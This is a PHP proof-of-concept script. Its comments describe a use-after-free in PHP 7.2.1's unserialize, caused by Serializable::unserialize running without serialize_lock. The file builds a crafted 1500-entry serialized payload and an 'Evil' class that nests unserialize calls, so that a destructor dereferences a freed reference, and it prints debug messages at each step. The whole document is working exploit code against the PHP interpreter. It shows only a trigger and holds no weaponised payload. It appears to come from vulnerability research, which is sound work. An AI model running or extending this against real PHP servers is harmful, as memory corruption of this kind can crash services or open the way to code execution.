<?php
// PHP 7.2.1 Calif PoC: zend_user_unserialize missing serialize_lock
// Same flow as 8.5.5: Serializable::unserialize() called without
// serialize_lock → inner unserialize reuses outer var_hash → UAF.

class Trigger {
    public function __destruct() {
        fwrite(STDERR, "[Trigger::__destruct] firing\n");
        $r = @unserialize('R:1500;');
        fwrite(STDERR, "[Trigger::__destruct] result type=" . gettype($r) . "\n");
    }
}

class Evil implements Serializable {
    public function serialize() { return ""; }
    public function unserialize($data) {
        fwrite(STDERR, "[Evil::unserialize] called\n");
        @unserialize('a:2:{i:0;O:7:"Trigger":0:{}i:0;i:42;}');
        fwrite(STDERR, "[Evil::unserialize] returned\n");
    }
}

$N = 1500;
$entries = '';
for ($i = 0; $i < $N; $i++) {
    $entries .= "i:$i;i:1;";
}
$payload = 'a:' . ($N + 1) . ':{' . $entries . 'i:' . $N . ';C:4:"Evil":1:{x}}';

fwrite(STDERR, "[main] outer unserialize\n");
@unserialize($payload);
fwrite(STDERR, "[main] done\n");
